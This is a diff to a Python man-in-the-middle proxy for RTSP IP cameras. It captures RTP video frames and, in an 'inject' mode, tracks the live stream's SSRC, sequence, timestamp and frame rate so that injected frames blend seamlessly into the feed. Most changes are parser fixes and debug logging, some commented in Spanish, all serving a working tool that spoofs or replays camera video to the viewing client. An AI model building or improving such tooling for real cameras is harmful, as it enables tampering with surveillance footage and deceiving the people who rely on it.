@@ -111,10 +111,11 @@ def write_captured_frame(fh, channel: int, rtp_payload: bytes):
     """Append one interleaved frame to the capture file."""
     rtp_len = len(rtp_payload)
     total_len = 1 + 1 + 2 + rtp_len  # channel + reserved + len16 + payload
-    header = struct.pack("!IBBHx", total_len, channel & 0xFF, 0, rtp_len)
+    header = struct.pack("!IBBH", total_len, channel & 0xFF, 0, rtp_len)
     fh.write(header)
     fh.write(rtp_payload)
     fh.flush()
+    os.fsync(fh.fileno())
 
 
 def read_capture_file(path: Path) -> Tuple[List[Tuple[int, bytes]],dict]:
@@ -137,7 +138,7 @@ def read_capture_file(path: Path) -> Tuple[List[Tuple[int, bytes]],dict]:
 
     while offset + RECORD_HEADER_SIZE <= len(data):
         total_len, channel, _reserved, rtp_len = struct.unpack_from(
-            "!IBBHx", data, offset
+            "!IBBH", data, offset
         )
         offset += RECORD_HEADER_SIZE
         if offset + rtp_len > len(data):
@@ -246,39 +247,70 @@ class InterleavedParser:
         self._buf = bytearray()
         self._on_frame = on_frame
         self._on_text = on_text
+        self._processing = False
 
     def feed(self, data: bytes):
+        if not data:
+            return
         self._buf.extend(data)
-        self._drain()
+        if not self._processing:
+            self._drain()
 
     def _drain(self):
-        while self._buf:
-            idx = self._buf.find(b"$")
-            if idx < 0:
-                # No interleaved marker — all text.
-                if len(self._buf) > 3:
-                    self._on_text(bytes(self._buf[:-3]))
-                    del self._buf[:-3]
-                return
-            if idx > 0:
-                self._on_text(bytes(self._buf[:idx]))
-                del self._buf[:idx]
-            # Need at least 4 bytes for the header.
-            if len(self._buf) < 4:
-                return
-            channel = self._buf[1]
-            length = struct.unpack("!H", self._buf[2:4])[0]
-            if length < 8 or length > self.MAX_FRAME:
-                # False '$' in RTSP text; skip one byte.
-                self._on_text(bytes(self._buf[:1]))
-                del self._buf[:1]
-                continue
-            total = 4 + length
-            if len(self._buf) < total:
-                return
-            frame = bytes(self._buf[4:total])
-            del self._buf[:total]
-            self._on_frame(channel, frame)
+        self._processing = True
+        try:
+            while True:
+                if len(self._buf) < 1:
+                    break
+                
+                # Buscar el marcador $
+                idx = self._buf.find(b"$")
+                if idx == -1:
+                    # No hay más frames interleaved
+                    if len(self._buf) > 0:
+                        self._on_text(bytes(self._buf))
+                        self._buf.clear()
+                    break
+                
+                # Si hay texto antes del marcador, procesarlo
+                if idx > 0:
+                    text = bytes(self._buf[:idx])
+                    self._on_text(text)
+                    del self._buf[:idx]
+                    # Continuar con el marcador
+                    continue
+                
+                # Ahora tenemos '$' en la posición 0
+                # Necesitamos al menos 4 bytes para la cabecera
+                if len(self._buf) < 4:
+                    break
+                
+                channel = self._buf[1]
+                length = struct.unpack("!H", self._buf[2:4])[0]
+                
+                # Validar el length
+                if length < 8 or length > self.MAX_FRAME:
+                    # Falso '$', saltar un byte
+                    self._on_text(bytes(self._buf[:1]))
+                    del self._buf[:1]
+                    continue
+                
+                # Verificar si tenemos el frame completo
+                if len(self._buf) < 4 + length:
+                    # Frame incompleto, esperar más datos
+                    break
+                
+                # Extraer el frame
+                rtp_payload = bytes(self._buf[4:4+length])
+                del self._buf[:4+length]
+                
+                # Llamar al callback
+                try:
+                    self._on_frame(channel, rtp_payload)
+                except Exception as e:
+                    logging.error(f"Error en on_frame: {e}")
+        finally:
+            self._processing = False
 
 
 # ──────────────────────────────────────────────────────────────────────────────
@@ -319,7 +351,10 @@ class MITMProxy:
         self.camera_host = camera_host
         self.camera_port = camera_port
         self.args = args
-        self.probe = RTPProbe(probe_duration=self.args.inject_delay, min_frames=30)
+        if args.mode == "inject":
+            self.probe = RTPProbe(probe_duration=self.args.inject_delay, min_frames=30)
+        else:
+            self.probe = None
         self.capture_fh = capture_fh
         self.inject_frames = inject_frames or []
 
@@ -350,6 +385,7 @@ class MITMProxy:
             upstream = socket.create_connection(
                 (self.camera_host, self.camera_port), timeout=10
             )
+            
         except OSError as e:
             log.error("Cannot connect to camera %s:%d — %s", self.camera_host, self.camera_port, e)
             self.client_sock.close()
@@ -413,18 +449,21 @@ class MITMProxy:
 
                 if sock is upstream:
                     # Camera → client: capture & forward
+                    log.debug(f"Data from CAMERA: {len(data)} bytes, first 20: {data[:20].hex()}")
                     up_parser.feed(data)
                     if not self.args.inject_only:
                         self._send_downstream(data)
                     self.stats["up_bytes"] += len(data)
                 else:
                     # Client → camera: forward transparently
+                    log.debug(f"Dta from the CLIENT: {len(data)} bytes, first 20: {data[:20].hex()}")
                     self._send_upstream(upstream, data)
                     self.stats["down_bytes"] += len(data)
 
             # Signal inject thread to start after warm-up delay.
             if (
-                not self._inject_started.is_set()
+                self.args.mode == "inject"
+                and not self._inject_started.is_set()
                 and time.time() - start >= self.args.inject_delay
             ):
                 self._inject_started.set()
@@ -433,32 +472,36 @@ class MITMProxy:
     # ──────────────────────────────────────────────────────────────────────────
     # Upstream frame callback (camera→us)
     # ──────────────────────────────────────────────────────────────────────────
-
+    
     def _on_upstream_frame(self, channel: int, rtp_payload: bytes):
-        if hasattr(self, "probe") and not self.probe.ready():
+        # === Lógica del probe (SOLO en modo inject) ===
+        if self.probe is not None and not self.probe.ready():
             self.probe.feed(channel, rtp_payload)
-
             if self.probe.ready() and not self._inject_started.is_set():
                 params = self.probe.params()
-
-                log.info(
-                    "Probe listo → PT=%s SSRC=%s FPS=%s",
-                    params["pt"],
-                    params["ssrc_hex"],
-                    params["fps"],
-                )
-
+                if params:
+                    log.info("=== PARÁMETROS RTP DETECTADOS ===")
+                    log.info("PT: %s", params.get("pt"))
+                    log.info("SSRC: %s", params.get("ssrc_hex"))
+                    log.info("FPS: %.2f", params.get("fps"))
+                    log.info("================================")
+                    if params.get("pt") is not None:
+                        self.args.pt = params["pt"]
+                    if params.get("ssrc") is not None:
+                        self.args.inject_ssrc = params["ssrc"]
+                    if params.get("fps") is not None and params["fps"] > 0:
+                        self.args.inject_fps = params["fps"]
+                        self._ts_per_frame = max(1, int(90000 / params["fps"]))
                 self._inject_started.set()
 
-
-	# Track sequence/timestamp for seamless injection continuity.
+        # === Tracking de secuencia y timestamp (SIEMPRE) ===
         parsed = rtp_parse(rtp_payload)
         if parsed:
             _, _, seq, ts, _ = parsed
             self._last_live_seq = seq
-            self._last_live_ts  = ts
+            self._last_live_ts = ts
 
-        # Record mode: save to file.
+        # === Captura (SIEMPRE en modo record) ===
         if self.capture_fh is not None:
             write_captured_frame(self.capture_fh, channel, rtp_payload)
             self.stats["captured"] += 1
@@ -467,7 +510,6 @@ class MITMProxy:
                 log.info("Capture limit %d reached — stopping capture.", limit)
                 self.capture_fh.close()
                 self.capture_fh = None
-
     # ──────────────────────────────────────────────────────────────────────────
     # Injection loop (runs in a daemon thread)
     # ──────────────────────────────────────────────────────────────────────────
